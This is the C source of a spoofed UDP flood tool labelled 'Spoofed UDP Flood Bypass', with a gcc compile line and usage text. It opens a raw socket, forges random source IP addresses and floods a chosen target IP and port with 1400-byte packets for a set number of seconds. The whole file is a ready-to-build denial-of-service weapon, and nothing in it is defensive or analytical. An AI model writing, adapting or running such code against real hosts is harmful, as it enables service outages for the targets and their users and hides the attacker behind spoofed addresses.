/*
================================================
Spoofed UDP Flood Bypass
Made By Rajexploit404

compiling

gcc -o udp-spoof spoof-udp.c -lpthread


=================================================
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 1400

char *target_ip;
int target_port;
int cons;        // concurrent packets per send
int duration;    // attack duration in seconds

int raw_sock;

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned int rand_ip() {
    return (rand() % 223 + 1) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
}

void build_packet(char *packet, struct sockaddr_in *sin) {
    struct iphdr *iph = (struct iphdr *) packet;
    struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr));
    int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD_SIZE;

    memset(packet, 0, packet_len);
    memset(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 0x41, MAX_PAYLOAD_SIZE);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(packet_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_ip();
    iph->daddr = sin->sin_addr.s_addr;
    iph->check = 0;
    iph->check = csum((unsigned short *)iph, iph->ihl*2);

    udph->source = htons(rand() % 65535);
    udph->dest = htons(target_port);
    udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD_SIZE);
    udph->check = 0;
}

void *udp_flood(void *arg) {
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD_SIZE;

    char *packet = malloc(packet_len);
    if (!packet) {
        perror("malloc");
        pthread_exit(NULL);
    }

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {
        for (int i = 0; i < cons; i++) {
            build_packet(packet, &sin);
            if (sendto(raw_sock, packet, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                perror("sendto");
            }
        }
    }

    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target_ip> <target_port> <cons> <duration>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 100 10\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    cons = atoi(argv[3]);
    duration = atoi(argv[4]);

    srand(time(NULL));

    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    printf("Starting UDP flood on %s:%d with %d concurrent packets for %d seconds\n",
           target_ip, target_port, cons, duration);

    pthread_t tid;
    pthread_create(&tid, NULL, udp_flood, NULL);

    pthread_join(tid, NULL);

    close(raw_sock);
    printf("Attack finished\n");
    return 0;
}
